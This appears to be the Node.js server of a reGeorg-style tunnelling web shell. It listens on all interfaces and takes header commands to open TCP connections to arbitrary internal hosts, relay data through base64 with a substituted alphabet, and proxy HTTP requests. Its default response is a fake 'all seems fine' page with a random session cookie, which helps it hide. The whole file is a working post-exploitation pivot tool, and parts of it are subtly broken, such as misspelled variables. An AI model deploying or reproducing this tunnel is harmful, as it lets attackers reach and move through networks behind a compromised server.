var http = require('http');
var net = require('net');
var en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var de = "BASE64 CHARSLIST";
var dataBuff = [];
var tcpconns = [];

var cmdheader = "X-CMD";
var redirectheader = "X-REDIRECTURL";
var targetheader = "X-TARGET";
var statusheader = "X-STATUS";
var errheader = "X-ERROR";

function createOutboundTCP(res, host, port, mark) {
    if(mark === null) {
		var tcpConn = new net.Socket();
		tcpConn.connect(port,host);
		tcpConn.on( 'connect', function() {
			tcpconns[mark] = tcpConn;
			databuff[mark] = new Array();

			res.writeHead(200,{'X-STATUS': 'OK'});
			res.end();
		});

		tcpConn.on('data', function(data) {
			dataBuff[mark].unshift(data);
		});

		tcpConn.on('error', function(error) {
			console.log("Error creating new Outbound: " + error.message);
			res.writeHead(200, {'X-STATUS':'FAIL','X-ERROR' : 'Failed connecting to target'});
			res.end();
		});
    }
    else if (mark != null && tcpconns[mark] == null) {
            var tcpConn = new net.Socket();
            tcpConn.connect(port,host);

            tcpConn.on( 'connect', function() {
				tcpconns[mark] = tcpConn;
				dataBuff[mark] = new Array();
				res.writeHead(200,{'X-STATUS': 'OK'});
				res.end();
            });

			tcpConn.on('data', function(data) {
				dataBuff[mark].unshift(data);
			});

            tcpConn.on('error', function(error){
				console.log("Error creating new Outbound: "+error.message);
				res.writeHead(200, {'X-STATUS':'FAIL','X-ERROR' : 'Failed connecting to target'});
				res.end();
            });
    } else {
        res.writeHead(200,{'X-STATUS': 'OK'});
        res.end();
    }
}

function readOutboundTCP(res, mark) {
	var currData = dataBuff[mark].pop();
	if(currData != null) {
		res.writeHead(200,{'X-STATUS': 'OK','Connection': 'Keep-Alive'});
		res.write(StrTr(Buffer.from(currData).toString('base64'), en, de));
		res.end();
	} else {
		console.log('NO DATA IN BUFFER');
		res.writeHead(200, {'X-STATUS': 'OK'});
		res.end();
	}

}

function disconnectOutboundTCP(res, mark, error) {
	var tcpConn=tcpconns[mark];

	if(tcpConn != null) {
		tcpConn.destroy();
		tcpConn = null;
		tcpconns[mark] = null;
		dataBuff[mark] = null;
	}

	if (error != null) {
		var sessionid = 'Ur' + Math.random();
		res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';', "XXXX": error.message});
		res.end();
	 } else {
		res.writeHead(200, {'X-STATUS': 'OK'});
		res.end();
	 }

}
function deault_page(res) {
	var sessionid = 'Ur' + Math.random();
	res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';'});
	res.end("Georg says, 'All seems fine'");
}

function forwardData(req, res, mark)
{
	var fdata;
	req.on('data', function (chunk) {
		fdata = chunk;
	});

	req.on('end', function (){
		if(fdata != null)
		{
			var tcpSocket = tcpconns[mark];
			if(tcpSocket != null)
			{
				databaffuer = new Buffer.from(StrTr(fdata.toString(), de, en), 'base64');
				tcpSocket.write(databaffuer);
				res.writeHead(200,{'X-STATUS': 'OK'});
				res.end();
			}
			else
			{
				console.log('No Cookie session to forward');
				res.writeHead(200,{'X-STATUS':'FAIL','X-ERROR':'POST request read filed'});
				res.end();
			}
		}
		else
		{
			console.log('No data in forward');
			res.writeHead(200,{'X-STATUS':'FAIL','X-ERROR':'POST request read filed'});
			res.end();
		}
	});
}

function StrTr(input, frm, to){
  var r = "";
  for (i=0; i < input.length; i++){
	index = frm.indexOf(input[i]);
	if (index != -1){
	  r += to[index];
	} else {
	  r += input[i];
	}
  }
  return r;
}

function chgheader(oldheaders){
	var newheaders = {}
	for(var item in oldheaders) {
		if (item == redirectheader.toLowerCase()){
			newheaders[redirectheader] = oldheaders[item];
		} else if (item == cmdheader.toLowerCase()){
			newheaders[cmdheader] = oldheaders[item];
		} else if (item == targetheader.toLowerCase()){
			newheaders[targetheader] = oldheaders[item];
		} else if (item == statusheader.toLowerCase()){
			newheaders[statusheader] = oldheaders[item];
		} else if (item == errheader.toLowerCase()){
			newheaders[errheader] = oldheaders[item];
		} else {
			newheaders[item] = oldheaders[item];
		}
	}
	return newheaders;
}

var server=http.createServer(function (req, res) {

	var headers = chgheader(req.headers);

	var cmd = headers[cmdheader];
	var rUrl = headers[redirectheader];
	res.statusCode = 200;
	
	if (rUrl != null){
		// redirect
		var url = require('url');
		var rUri = Buffer.from(StrTr(headers[redirectheader], de, en), 'base64').toString();
		var urlObj = url.parse(rUri);

		headers["host"] = urlObj.host;
		delete headers[redirectheader];

		var options = {
			host: urlObj.host,
			hostname: urlObj.hostname,
			port: urlObj.port,
			path: urlObj.path,
			method: req.method,
			headers: headers
		};

		const proxyRequest = http.request(options);
		proxyRequest.on('response', function (proxyResponse) {
			proxyResponse.headers = chgheader(proxyResponse.headers);
			for (var item in proxyResponse.headers) {
				res.setHeader(item, proxyResponse.headers[item]);
			}
			proxyResponse.pipe(res);
		});
		req.pipe(proxyRequest);

	} else if (cmd != null) {
		// cmd
		mark = cmd.substring(0, 22);
		cmd = cmd.substring(22);
		if (cmd == "CONNECT") {
			try {
				var target_str = Buffer.from(StrTr(headers[targetheader], de, en), 'base64').toString();
				var target_ary = target_str.split("|");
				var target = target_ary[0];
				port = parseInt(target_ary[1]);
				createOutboundTCP(res, target, port, mark);
			} catch(error) {
				disconnectOutboundTCP(res, mark, error);
			}
		} else if (cmd == "DISCONNECT") {
			try {
				disconnectOutboundTCP(res, mark, null);
			} catch(error) {
				disconnectOutboundTCP(res, mark, error);
			}
		} else if (cmd == "READ") {
			try {
				readOutboundTCP(res, mark);
			} catch(error) {
				disconnectOutboundTCP(res, mark, error);
			}
		} else if (cmd == "FORWARD") {
			try {
				forwardData(req, res, mark);
			} catch(error) {
				disconnectOutboundTCP(res, mark, error);
			}
		} else {
			deault_page(res);
		}
	} else {
		deault_page(res);
	}

});

server.listen(65000, '0.0.0.0');
